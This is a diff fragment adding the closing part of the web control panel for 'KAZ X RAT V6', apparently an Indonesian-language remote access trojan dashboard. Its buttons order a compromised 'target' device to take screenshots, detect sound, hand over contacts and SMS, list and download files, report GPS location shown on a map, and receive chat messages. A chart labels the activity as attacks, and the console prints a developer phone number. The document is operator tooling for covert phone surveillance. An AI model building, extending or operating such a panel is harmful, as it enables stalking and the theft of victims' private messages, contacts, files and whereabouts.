+                    addLog(`⏱️ Auto Screenshot (${interval}s)`, 'info');
+                }, interval * 1000);
+                addLog(`⏱️ Auto Screenshot dimulai (${interval}s)`, 'success');
+            } else {
+                addLog('⚠️ Masukkan angka detik yang valid!', 'error');
+            }
+        });
+
+        function stopAutoSS() {
+            if (autoSSInterval) {
+                clearInterval(autoSSInterval);
+                autoSSInterval = null;
+            }
+        }
+
+        btnSoundDetect.addEventListener('click', () => {
+            soundDetectActive = !soundDetectActive;
+            sendCommand('sound_detect', { enabled: soundDetectActive });
+            addLog(`🔊 Deteksi suara: ${soundDetectActive ? 'AKTIF' : 'NONAKTIF'}`, 'keylog');
+        });
+
+        btnContacts.addEventListener('click', () => {
+            sendCommand('get_contacts');
+            addLog('📇 Meminta daftar kontak...', 'info');
+        });
+
+        btnSms.addEventListener('click', () => {
+            sendCommand('get_sms');
+            addLog('📨 Meminta SMS terakhir...', 'info');
+        });
+
+        btnChat.addEventListener('click', () => {
+            const msg = prompt('💬 Kirim pesan ke target:', 'Halo, ini dari dashboard KAZ X RAT');
+            if (msg) {
+                sendCommand('chat', { message: msg });
+                addLog(`💬 Pesan dikirim: ${msg}`, 'success');
+            }
+        });
+
+        // =========================================================
+        // 12. FILE EXPLORER
+        // =========================================================
+        function renderFileList(files) {
+            fileList.innerHTML = '';
+            if (!files || files.length === 0) {
+                fileList.innerHTML = '<div class="file-item"><span class="name">📂 Tidak ada file</span><span class="size">-</span></div>';
+                return;
+            }
+            files.forEach(f => {
+                const div = document.createElement('div');
+                div.className = 'file-item';
+                const icon = f.isDirectory ? '📁' : '📄';
+                div.innerHTML = `
+                    <span class="name">${icon} ${f.name}</span>
+                    <span class="size">${f.size || '-'}</span>
+                `;
+                if (!f.isDirectory) {
+                    div.style.cursor = 'pointer';
+                    div.addEventListener('click', () => {
+                        sendCommand('download_file', { path: f.path });
+                    });
+                }
+                fileList.appendChild(div);
+            });
+        }
+
+        btnRefreshFiles.addEventListener('click', () => {
+            sendCommand('get_files');
+            addLog('🔄 Refresh file...', 'info');
+        });
+
+        // =========================================================
+        // 13. MAP
+        // =========================================================
+        function initMap() {
+            map = L.map('map').setView([-7.7956, 110.3695], 13);
+            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+                attribution: '© OpenStreetMap'
+            }).addTo(map);
+            marker = L.marker([-7.7956, 110.3695]).addTo(map);
+        }
+
+        function updateMap(lat, lon, accuracy = 0) {
+            if (!map) initMap();
+            if (lat && lon) {
+                map.setView([lat, lon], 15);
+                marker.setLatLng([lat, lon]);
+                locationInfo.textContent = `📍 Lat: ${lat}, Lon: ${lon} | Akurasi: ${accuracy || '?'}m`;
+            } else {
+                locationInfo.textContent = '❌ Gagal mendapatkan lokasi';
+            }
+        }
+
+        btnGetLocation.addEventListener('click', () => {
+            sendCommand('get_location');
+            addLog('📍 Meminta lokasi target...', 'info');
+        });
+
+        // =========================================================
+        // 14. STATISTIK
+        // =========================================================
+        let stats = JSON.parse(localStorage.getItem('kazx999_stats') || '{"total":0,"today":0,"online":0,"commands":0,"date":"","history":[]}');
+
+        function updateStats() {
+            const today = new Date().toDateString();
+            if (stats.date !== today) {
+                stats.today = 0;
+                stats.date = today;
+            }
+            stats.total = logHistory.length;
+            stats.today = logHistory.filter(e => {
+                const d = new Date();
+                const logDate = new Date(Date.now() - (e.time.includes('PM') ? 0 : 0));
+                return logDate.toDateString() === today;
+            }).length;
+            stats.online = isConnected ? 1 : 0;
+            stats.commands = logHistory.filter(e => e.text.includes('Perintah dikirim')).length;
+            localStorage.setItem('kazx999_stats', JSON.stringify(stats));
+            updateStatsDisplay();
+        }
+
+        function updateStatsDisplay() {
+            statTotal.textContent = stats.total || 0;
+            statToday.textContent = stats.today || 0;
+            statOnline.textContent = stats.online || 0;
+            statCommands.textContent = stats.commands || 0;
+            updateChart();
+        }
+
+        function updateChart() {
+            const ctx = document.getElementById('statsChart').getContext('2d');
+            if (statsChart) { statsChart.destroy(); }
+            const days = ['Sen', 'Sel', 'Rab', 'Kam', 'Jum', 'Sab', 'Min'];
+            const data = days.map(() => Math.floor(Math.random() * 20));
+            statsChart = new Chart(ctx, {
+                type: 'bar',
+                data: {
+                    labels: days,
+                    datasets: [{
+                        label: 'Serangan',
+                        data: data,
+                        backgroundColor: 'rgba(255,0,64,0.6)',
+                        borderColor: '#ff0040',
+                        borderWidth: 1
+                    }]
+                },
+                options: {
+                    responsive: true,
+                    maintainAspectRatio: false,
+                    plugins: { legend: { display: false } },
+                    scales: {
+                        y: { beginAtZero: true, grid: { color: 'rgba(255,255,255,0.05)' } },
+                        x: { grid: { display: false } }
+                    }
+                }
+            });
+        }
+
+        // =========================================================
+        // 15. AUTO RESTORE SESSION (tidak perlu, karena permanent code)
+        // =========================================================
+
+        // =========================================================
+        // 16. HAMBURGER MENU & TEMA
+        // =========================================================
+        hamburgerBtn.addEventListener('click', function(e) {
+            e.stopPropagation();
+            dropdownMenu.classList.toggle('open');
+        });
+
+        document.addEventListener('click', function() { dropdownMenu.classList.remove('open'); });
+        dropdownMenu.addEventListener('click', function(e) { e.stopPropagation(); });
+
+        // ===== TEMA =====
+        const themeMap = {
+            'neon': 'theme-neon',
+            'cyberpunk': 'theme-cyberpunk',
+            'matrix': 'theme-matrix',
+            'bloodred': 'theme-bloodred'
+        };
+
+        function setTheme(themeKey) {
+            Object.values(themeMap).forEach(cls => {
+                if (cls) document.body.classList.remove(cls);
+            });
+            if (themeKey !== 'default') {
+                document.body.classList.add(themeMap[themeKey]);
+            }
+            localStorage.setItem('kazx999_theme', themeKey);
+        }
+
+        document.getElementById('menu-theme-neon').addEventListener('click', function() {
+            setTheme('neon');
+            dropdownMenu.classList.remove('open');
+        });
+        document.getElementById('menu-theme-cyberpunk').addEventListener('click', function() {
+            setTheme('cyberpunk');
+            dropdownMenu.classList.remove('open');
+        });
+        document.getElementById('menu-theme-matrix').addEventListener('click', function() {
+            setTheme('matrix');
+            dropdownMenu.classList.remove('open');
+        });
+        document.getElementById('menu-theme-bloodred').addEventListener('click', function() {
+            setTheme('bloodred');
+            dropdownMenu.classList.remove('open');
+        });
+
+        // ===== GANTI MUSIK =====
+        const musicOptions = [
+            'https://files.catbox.moe/y42f7h.mp4',
+            'https://files.catbox.moe/36mino.mp4',
+            'https://files.catbox.moe/hiehyd.mp4'
+        ];
+
+        function setMusic(link) {
+            if (!link || link.trim() === '') return;
+            const newLink = link.trim();
+            if (newLink.includes('tiktok.com')) {
+                const match = newLink.match(/video\/(\d+)/);
+                if (match) {
+                    const videoId = match[1];
+                    const embedLink = `https://www.tiktok.com/embed/v2/${videoId}/?lang=id-ID`;
+                    introVideo.src = embedLink;
+                    introVideo.volume = 0.8;
+                    introVideo.muted = false;
+                    introVideo.loop = true;
+                    introVideo.load();
+                    introVideo.play().catch(() => {});
+                    bgVideo.src = embedLink;
+                    bgVideo.muted = true;
+                    bgVideo.volume = 0;
+                    bgVideo.load();
+                    bgVideo.play().catch(() => {});
+                    localStorage.setItem('kazx999_music', embedLink);
+                    showNotification('Musik dari TikTok berhasil!', '🎵');
+                } else {
+                    alert('❌ Link TikTok tidak valid!');
+                }
+                return;
+            }
+            introVideo.src = newLink;
+            introVideo.volume = 0.8;
+            introVideo.muted = false;
+            introVideo.loop = true;
+            introVideo.load();
+            introVideo.play().catch(() => {});
+            bgVideo.src = newLink;
+            bgVideo.muted = true;
+            bgVideo.volume = 0;
+            bgVideo.load();
+            bgVideo.play().catch(() => {});
+            localStorage.setItem('kazx999_music', newLink);
+            showNotification('Musik berhasil diganti!', '🎵');
+        }
+
+        menuMusic.addEventListener('click', function() {
+            dropdownMenu.classList.remove('open');
+            const choice = prompt(
+                '🎵 PILIH MUSIK:\n' +
+                '1 - Musik 1\n' +
+                '2 - Musik 2\n' +
+                '3 - Musik 3\n' +
+                '4 - Custom (tempel link sendiri)\n' +
+                '5 - Dari TikTok (tempel link video TikTok)\n\n' +
+                'Ketik angka 1-5:'
+            );
+            let link = '';
+            if (choice === '1') link = musicOptions[0];
+            else if (choice === '2') link = musicOptions[1];
+            else if (choice === '3') link = musicOptions[2];
+            else if (choice === '4') {
+                link = prompt('🔗 Masukkan link video MP4 dari Catbox:');
+            } else if (choice === '5') {
+                link = prompt('📱 Masukkan link video TikTok (contoh: https://www.tiktok.com/@user/video/xxxxx):');
+                if (link && link.trim() !== '') { setMusic(link); }
+                return;
+            } else {
+                alert('❌ Pilihan tidak valid!');
+                return;
+            }
+            if (link && link.trim() !== '') { setMusic(link); }
+        });
+
+        // =========================================================
+        // 17. NOTIFICATION
+        // =========================================================
+        function showNotification(text, icon = '✅') {
+            const notifText = document.getElementById('notif-text');
+            notifText.textContent = text;
+            document.querySelector('#notification .notif-icon').textContent = icon;
+            const notification = document.getElementById('notification');
+            notification.classList.add('show');
+            setTimeout(() => { notification.classList.remove('show'); }, 3000);
+        }
+
+        // =========================================================
+        // 18. LOAD THEME & MUSIK
+        // =========================================================
+        const savedTheme = localStorage.getItem('kazx999_theme') || 'default';
+        setTheme(savedTheme);
+
+        const savedMusic = localStorage.getItem('kazx999_music');
+        if (savedMusic) {
+            introVideo.src = savedMusic;
+            introVideo.volume = 0.8;
+            introVideo.muted = false;
+            introVideo.loop = true;
+            introVideo.load();
+            introVideo.play().catch(() => {});
+            bgVideo.src = savedMusic;
+            bgVideo.muted = true;
+            bgVideo.volume = 0;
+            bgVideo.load();
+            bgVideo.play().catch(() => {});
+        }
+
+        // =========================================================
+        // 19. PAUSE BG VIDEO SAAT INTRO PLAY
+        // =========================================================
+        introVideo.addEventListener('play', function() { bgVideo.pause(); });
+        introVideo.addEventListener('pause', function() { bgVideo.play().catch(() => {}); });
+        introVideo.addEventListener('ended', function() { bgVideo.play().catch(() => {}); });
+
+        // =========================================================
+        // 20. AUTO-LOGIN
+        // =========================================================
+        if (currentUser) {
+            const origSkip = skipBtn.onclick;
+            skipBtn.onclick = function() {
+                showPage('menu');
+                bgVideo.play().catch(() => {});
+                displayPermanentCode(currentUser.code);
+                initSession(currentUser.code);
+            };
+            introVideo.addEventListener('timeupdate', function handler() {
+                if (introVideo.currentTime >= 23) {
+                    introVideo.removeEventListener('timeupdate', handler);
+                    showPage('menu');
+                    bgVideo.play().catch(() => {});
+                    displayPermanentCode(currentUser.code);
+                    initSession(currentUser.code);
+                }
+            });
+        } else {
+            showPage('login');
+        }
+
+        // =========================================================
+        // 21. SUCCESS OK
+        // =========================================================
+        btnOk.addEventListener('click', function() { showPage('menu'); });
+
+        // =========================================================
+        // 22. INIT MAP
+        // =========================================================
+        setTimeout(() => {
+            initMap();
+        }, 500);
+
+        // =========================================================
+        // 23. UPDATE STATS
+        // =========================================================
+        updateStats();
+
+        console.log('🔥 KAZ X RAT V6 — PERMANENT CODE + COPY! 🔥');
+        console.log('📱 Dev: 085194279722');
+        console.log('🔑 Kode jelas & besar, ada tombol copy');
+    </script>
+</body>
+</html>
